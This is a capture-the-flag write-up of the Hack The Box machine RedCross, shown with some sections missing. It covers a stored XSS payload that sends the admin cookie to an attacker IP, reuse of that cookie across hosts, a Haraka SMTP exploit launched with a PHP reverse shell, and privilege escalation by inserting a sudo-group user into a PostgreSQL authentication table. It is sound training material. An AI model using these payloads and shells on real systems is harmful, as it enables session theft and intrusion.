<h2 id="2-web-enumeration">2. Web Enumeration</h2>
<h3 id="add-hosts-entry">Add hosts entry</h3>
<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">echo "10.129.11.228 redcross.htb intra.redcross.htb admin.redcross.htb" | sudo tee -a /etc/hosts
</code></pre>

<p>Apache uses the <code>Host:</code> header to route requests to virtual hosts. Without adding the hostname to <code>/etc/hosts</code>, we can't reach the site at all - we'd get a redirect loop or wrong content. add every discovered hostname.</p>
<h3 id="explore-intra-redcross-htb">Explore intra.redcross.htb</h3>
<p>Browsing to <code>https://intra.redcross.htb/</code> reveals:</p>
<ul>
<li>A login form (<code>/?page=login</code>)</li>
<li>A contact form link (<code>/?page=contact</code>)</li>
<li>The message: <em>"Please contact with our staff via contact form to request your access credentials"</em></li>
</ul>
<p>The <code>?page=</code> URL parameter is a strong clue - it means PHP is <strong>including files by name</strong>. This pattern is often vulnerable to <strong>Local File Inclusion (LFI)</strong> and tells us the site structure.</p>
<h3 id="discover-admin-redcross-htb">Discover admin.redcross.htb</h3>
<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash"># manual check since gobuster wordlists missed it

</code></pre>
<p>We find an "IT Admin panel" login at <code>admin.redcross.htb</code>. We need credentials to access it.</p>
<h3 id="enumerate-the-contact-form">Enumerate the contact form</h3>
<pre tabindex="0" aria-label="bash code or terminal block 5"><code class="language-bash" data-language="bash">curl -sk "https://intra.redcross.htb/?page=contact"
</code></pre>
<p>The form has three fields:</p>
<ul>
<li><code>subject</code> : filtered against HTML</li>
<li><code>body</code> : filtered against HTML  </li>
<li><code>cback</code> : contact phone or email ← <strong>NOT filtered</strong></li>
</ul>

<blockquote>
<p>When you see a <code>?page=</code> parameter, immediately think: LFI, path traversal, and what pages exist. read every form field name in the HTML source - developers often apply input validation inconsistently across fields, protecting obvious ones while forgetting others.</p>
</blockquote>

<h2 id="3-xss-via-contact-form">3. XSS via Contact Form</h2>
<h3 id="the-vulnerability">The Vulnerability</h3>
<p>The web application runs an automated admin bot that reads contact form submissions and renders them in a browser. If we inject JavaScript into a field that isn't sanitized, the admin's browser will execute it and we can steal their session cookie.</p>
<p><strong>The catch:</strong> The <code>subject</code> and <code>body</code> fields filter <code>&lt;</code> characters. But <code>cback</code> (callback contact) does not.</p>
<h3 id="testing-the-filter">Testing the filter</h3>
<pre tabindex="0" aria-label="bash code or terminal block 6"><code class="language-bash" data-language="bash"># This gets blocked (Oops! message):
curl -sk -X POST "https://intra.redcross.htb/pages/actions.php" \
  -d "subject=Test&amp;body=Hello+%3C&amp;cback=test@test.com&amp;action=contact"

# This succeeds:
curl -sk -X POST "https://intra.redcross.htb/pages/actions.php" \
  -d "subject=Test&amp;body=Hello&amp;cback=%3Ctest%3E&amp;action=contact"
</code></pre>
<p>Finding this required <strong>testing each field in isolation</strong> - a critical technique when WAFs or filters are involved.</p>
<h3 id="set-up-the-listener">Set up the listener</h3>
<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">mkdir -p /tmp/xss &amp;&amp; cd /tmp/xss
python3 -m http.server 8888
</code></pre>
<p>We need a server to receive the stolen cookie. The admin's browser will make an HTTP request to us carrying their session data.</p>
<h3 id="fire-the-xss">Fire the XSS</h3>
<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">curl -sk -X POST "https://intra.redcross.htb/pages/actions.php" \
  --data-urlencode "subject=Test" \
  --data-urlencode "body=Hello" \
  --data-urlencode "cback=&lt;script&gt;new Image().src='http://10.10.16.84:8888/?c='+document.cookie&lt;/script&gt;" \
  --data-urlencode "action=contact"
</code></pre>
<p><strong>Why <code>new Image().src</code> instead of <code>document.location</code>?</strong><br><code>document.location</code> redirects the page - the admin's current tab navigates away, which might look suspicious or break the admin's workflow. <code>new Image().src</code> is a silent, background request that doesn't change the page - stealthier and more reliable.</p>
<h3 id="result-after-60-seconds">Result (after ~60 seconds)</h3>
<pre tabindex="0" aria-label="Code or terminal block 9"><code>10.129.11.228 - "GET /?c=PHPSESSID=0d72obo510l0edfavp4132hfr3; LANG=EN_US; SINCE=1780937251; LIMIT=10; DOMAIN=admin"
</code></pre>
<p>We captured the admin's full cookie jar.</p>

<blockquote>
<p>XSS is a client-side attack - your target is the <strong>user's browser</strong>, not the server. Stored XSS is powerful because you plant the payload once and it fires every time someone views it. When a WAF blocks your payload, don't give up - systematically test each field independently, and try multiple event handlers (<code>onerror</code>, <code>onload</code>, <code>src=</code>). The filter is rarely applied consistently everywhere.</p>
</blockquote>

<h2 id="4-admin-panel-access">4. Admin Panel Access</h2>
<h3 id="use-the-stolen-cookie">Use the stolen cookie</h3>
<pre tabindex="0" aria-label="bash code or terminal block 10"><code class="language-bash" data-language="bash">curl -sk "https://intra.redcross.htb/?page=admin" \
  -H "Cookie: PHPSESSID=0d72obo510l0edfavp4132hfr3; LANG=EN_US; SINCE=1780937251; LIMIT=10; DOMAIN=admin"

curl -sk "https://admin.redcross.htb/" \
  -H "Cookie: PHPSESSID=0d72obo510l0edfavp4132hfr3; LANG=EN_US; SINCE=1780937251; LIMIT=10; DOMAIN=admin"
</code></pre>
<p>Both panels confirm <code>[[admin]]</code> - we're authenticated on both sites with the same session.</p>
<h3 id="why-does-the-same-cookie-work-on-admin-redcross-htb">Why does the same cookie work on admin.redcross.htb?</h3>
<p>Both virtual hosts share the same PHP session backend. When the <code>DOMAIN=admin</code> cookie is set, the application grants access to the IT admin panel. This is a <strong>broken access control</strong> design - the session was created on the intra site but is honoured on the admin site without re-authentication.</p>
<h3 id="what-the-admin-panel-offers">What the admin panel offers</h3>
<ul>
<li><strong><code>?page=users</code></strong> : Add/delete virtual system users</li>
<li><strong><code>?page=firewall</code></strong> : Whitelist IP addresses in iptables</li>
</ul>

<p>Session cookies are portable. Once you have a valid session token, try it everywhere - different subdomains, different pages, different HTTP methods. Developers often assume that because a user authenticated on site A, their session is "for" site A only. This assumption is frequently wrong.</p>

<pre tabindex="0" aria-label="Code or terminal block 14"><code>21/tcp   open  ftp         vsftpd

<p>The machine uses <strong>iptables-based network access control</strong> to hide services from the public internet. Only whitelisted IPs can reach them. This is a common real-world pattern - internal services shouldn't be internet-facing. By gaining access to the admin panel, we gained the ability to punch holes in this firewall.</p>

<h2 id="6-ssh-jail-virtual-user-creation">6. SSH Jail: Virtual User Creation</h2>
<h3 id="create-a-virtual-user">Create a virtual user</h3>
<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">curl -sk -X POST "https://admin.redcross.htb/pages/actions.php" \
  -H "Cookie: PHPSESSID=0d72obo510l0edfavp4132hfr3; ..." \
  -d "username=hacker01&amp;action=adduser"
</code></pre>
<p>Response:</p>
<pre tabindex="0" aria-label="Code or terminal block 16"><code>Provide this credentials to the user: hacker01 : q7s76PIg
</code></pre>
<h3 id="ssh-in">SSH in</h3>
<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">ssh hacker01@10.129.11.228
# password: REDACTED
$ id
uid=2020 gid=1001(associates) groups=1001(associates)
</code></pre>
<h3 id="the-chroot-jail">The chroot jail</h3>
<p>We land in a minimal environment. <code>ls /</code> shows only: <code>bin dev etc home lib lib64 root usr</code>.</p>
<p>This is <strong>not the real filesystem</strong> - it's a chroot jail. The <code>sshd_config</code> contains:</p>
<pre tabindex="0" aria-label="Code or terminal block 18"><code>Match group associates
    ChrootDirectory /var/jail/
</code></pre>
<p>Anyone in the <code>associates</code> group (GID 1001) gets chrooted to <code>/var/jail/</code>. The jail's <code>/home</code> contains:</p>
<ul>
<li><code>interface_data/</code> : empty</li>
<li><code>public/</code> : group-writable, contains <code>src/iptctl.c</code></li>
</ul>
<p>The jail's <code>/etc/passwd</code> reveals real system user: <code>penelope:x:1000:1000</code>.</p>
<h3 id="reading-iptctl-c">Reading iptctl.c</h3>
<p>The C source code in the jail reveals a SUID root binary at <code>/opt/iptctl/iptctl</code> on the real system. It has a <strong>stack buffer overflow</strong> in interactive mode (<code>fgets</code> reading 360 bytes into 16-byte buffers). This is noted for later privilege escalation.</p>

<p>Even a restricted shell is valuable. We can:</p>
<ol>
<li>Enumerate the jail's filesystem for clues</li>
<li>Read source code (iptctl.c) left by developers</li>
<li>Write files to the shared <code>/home/public</code> directory</li>
<li>Use bash's built-in <code>/dev/tcp</code> to reach services on localhost</li>
</ol>

<blockquote>
<p>A limited shell is better than no shell. Chroot jails often contain artifacts that developers left behind - source code, configuration hints, credentials. read everything available. The iptctl.c source gave us not only a privesc path (buffer overflow) but also confirmed the application architecture and the jail path (<code>/var/jail/</code>).</p>
</blockquote>

<h2 id="7-haraka-smtp-rce-shell-as-penelope">7. Haraka SMTP RCE: Shell as Penelope</h2>
<h3 id="identify-port-1025">Identify port 1025</h3>
<pre tabindex="0" aria-label="bash code or terminal block 19"><code class="language-bash" data-language="bash">nc -nv 10.129.11.228 1025
# After waiting: "220 redcross ESMTP Haraka 2.8.8 ready"
</code></pre>
<p>Port 1025 is <strong>Haraka</strong>, a Node.js SMTP server. Version 2.8.8 is vulnerable to Remote Code Execution.</p>
<h3 id="why-haraka-is-vulnerable">Why Haraka is vulnerable</h3>
<p>Haraka's attachment plugin extracts ZIP attachments and processes them. The exploit sends a crafted ZIP containing a file named with shell metacharacters. When Haraka processes the attachment, it executes arbitrary commands - in the context of the user running Haraka (penelope, who owns the process).</p>
<h3 id="get-and-patch-the-exploit">Get and patch the exploit</h3>
<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash">searchsploit -m linux/remote/41162.py
# Fix port: change line 123 from port 25 to 1025
sed -i 's/smtplib.SMTP(mailserver,25)/smtplib.SMTP(mailserver,1025)/' 41162.py
</code></pre>
<p>The exploit hardcodes port 25 (standard SMTP). Haraka runs on 1025 here, so we patch it.</p>
<h3 id="set-up-listener-and-fire">Set up listener and fire</h3>
<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">nc -lvnp 4444 &amp;

python2 41162.py \
  -c "php -r '\$sock=fsockopen(\"10.10.16.84\",4444);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'" \
  -t penelope@redcross.htb \
  -m 10.129.11.228
</code></pre>
<p>After ~60 seconds:</p>
<pre tabindex="0" aria-label="bash code or terminal block 22"><code class="language-bash" data-language="bash">$ id
uid=1000(penelope) gid=1000(penelope) groups=1000(penelope)
</code></pre>
<h3 id="why-target-penelope-redcross-htb">Why target <a href="mailto:penelope@redcross.htb">Penelope@redcross.htb</a>?</h3>
<p>Haraka processes emails destined for local users. The user <code>penelope</code> was identified from:</p>
<ol>
<li>The SSL certificate email field</li>
<li>The chroot jail's <code>/etc/passwd</code></li>
<li>The process list (Haraka runs as penelope)</li>
</ol>
<p>Sending email to <code>penelope@redcross.htb</code> routes it through the local Haraka instance that penelope owns and runs.</p>

<blockquote>
<p>When you see an unusual port with an unfamiliar service, look for known exploits immediately. <code>searchsploit haraka</code> found the CVE in seconds. Custom services, legacy versions, and niche software are useful sources because they're often unpatched and unknown to defenders. The key insight here was that the <strong>service version</strong> (2.8.8) pinpointed an exact public exploit - this is why capturing service versions during recon is so important.</p>
</blockquote>

<h2 id="9-privilege-escalation-via-postgresql">9. Privilege Escalation via PostgreSQL</h2>
<h3 id="find-the-database-credentials">Find the database credentials</h3>
<p>The PHP source code at <code>/var/www/html/admin/pages/actions.php</code> contains hardcoded credentials:</p>
<pre tabindex="0" aria-label="php code or terminal block 24"><code class="language-php" data-language="php">$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=REDACTED&amp;");
</code></pre>
<p>These were found in the writeup (and accessible as <code>www-data</code> or <code>penelope</code> on the real system).</p>
<h3 id="understanding-the-jail-architecture-nss-postgresql">Understanding the jail architecture: NSS + PostgreSQL</h3>
<p>The SSH chroot system doesn't use <code>/etc/passwd</code> and <code>/etc/shadow</code> for virtual users. Instead it uses <strong>Name Service Switch (NSS)</strong> backed by PostgreSQL. The <code>passwd_table</code> in the <code>unix</code> database is the actual source of truth for user accounts, home directories, group IDs, and password hashes.</p>
<p>This means: <strong>if we can modify that table, we control user attributes</strong>.</p>
<h3 id="connect-to-postgresql">Connect to PostgreSQL</h3>
<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">psql -h 127.0.0.1 -U unixusrmgr -d unix
# password: REDACTED
</code></pre>
<pre tabindex="0" aria-label="sql code or terminal block 26"><code class="language-sql" data-language="sql">-- View current users
SELECT * FROM passwd_table;

-- View available tables
\dt
-- passwd_table, shadow_table, group_table, usergroups
</code></pre>
<h3 id="insert-a-user-with-sudo-group-gid-27">Insert a user with sudo group (GID 27)</h3>
<pre tabindex="0" aria-label="sql code or terminal block 27"><code class="language-sql" data-language="sql">insert into passwd_table (username, passwd, gid, homedir) 
values ('r00t', '$1$wV7CPbj9$59kAklYgquXe5TuJYIT591', 27, '/');
</code></pre>
<ul>
<li><strong>GID 27</strong> = the <code>sudo</code> group on Debian</li>
<li><strong>Passwd hash</strong> = MD5 crypt of <code>0xdf</code> (generated with <code>openssl passwd -1 0xdf</code>)</li>
<li><strong>Homedir = <code>/</code></strong> = not chrooted (chroot only applies to associates group GID 1001)</li>
</ul>

<ol>
<li>The user <code>r00t</code> has GID 27 (sudo), NOT GID 1001 (associates)</li>
<li><code>sshd_config</code> only chroots the <code>associates</code> group - <code>r00t</code> gets a full shell</li>
<li>The sudo group grants <code>ALL=(ALL:ALL) ALL</code> by default on Debian</li>
<li>We know our user's password, so we can <code>sudo su</code></li>
</ol>

<blockquote>
<p>When you control a database that defines system users, you own the system. This is why database access control is so critical - the <code>unixusrmgr</code> role could insert users but not set UIDs directly (permission denied). However, it <strong>could</strong> set GIDs. One writable column was enough. enumerate what you CAN modify, not just what the obvious path is. The developers locked down <code>uid=0</code> but forgot that <code>gid=27</code> (sudo) is equally dangerous.</p>
</blockquote>

<h2 id="11-key-lessons">11. Key lessons</h2>
<h3 id="lesson-1-ssl-certificates-are-intelligence">Lesson 1: SSL Certificates Are Intelligence</h3>
<p>The certificate revealed <code>penelope@redcross.htb</code> - which became the Haraka email target. Do not skip reading certificate metadata.</p>
<h3 id="lesson-2-test-input-fields-individually">Lesson 2: Test Input Fields Individually</h3>
<p>The WAF blocked <code>&lt;</code> in <code>subject</code> and <code>body</code> but not in <code>cback</code>. Developers apply validation inconsistently. When one field is blocked, try all the others before giving up.</p>
<h3 id="lesson-3-re-enumerate-after-every-change">Lesson 3: Re-Enumerate After Every Change</h3>
<p>The firewall whitelist completely changed the attack surface. Three new services appeared that weren't visible before. Treat the target as a dynamic system, not a static one.</p>
<h3 id="lesson-4-a-chroot-jail-is-not-a-dead-end">Lesson 4: A Chroot Jail Is Not a Dead End</h3>
<p>The jail gave us: the real user (penelope), the chroot path (<code>/var/jail/</code>), the binary source code (iptctl.c), and write access to a shared directory. A restricted shell is still a foothold.</p>
<h3 id="lesson-5-identify-every-service-version">Lesson 5: Identify Every Service Version</h3>
<p>Haraka 2.8.8 had a public CVE. <code>searchsploit haraka</code> returned the exploit in one command. Version identification during recon directly translates to exploit selection.</p>
<h3 id="lesson-6-hardcoded-credentials-in-source-code-are-common">Lesson 6: Hardcoded Credentials in Source Code Are Common</h3>
<p>The PostgreSQL password was in plaintext in <code>actions.php</code>. After gaining any level of filesystem access, always grep for connection strings: <code>grep -r "pg_connect\|mysql_connect\|password=" .</code></p>
<h3 id="lesson-7-understand-the-authentication-backend">Lesson 7: Understand the Authentication Backend</h3>
<p>The system used NSS+PostgreSQL instead of <code>/etc/passwd</code>. Understanding <em>how</em> authentication works unlocked the privilege escalation: we didn't need to crack passwords or exploit a binary - we just wrote a new privileged user directly into the auth database.</p>
<h3 id="lesson-8-gid-can-be-as-dangerous-as-uid">Lesson 8: GID Can Be as Dangerous as UID</h3>
<p>Being blocked from setting <code>uid=0</code> felt like a dead end. But <code>gid=27</code> (sudo group) is equally powerful on a default Debian system. think about group memberships, not just user IDs.</p>
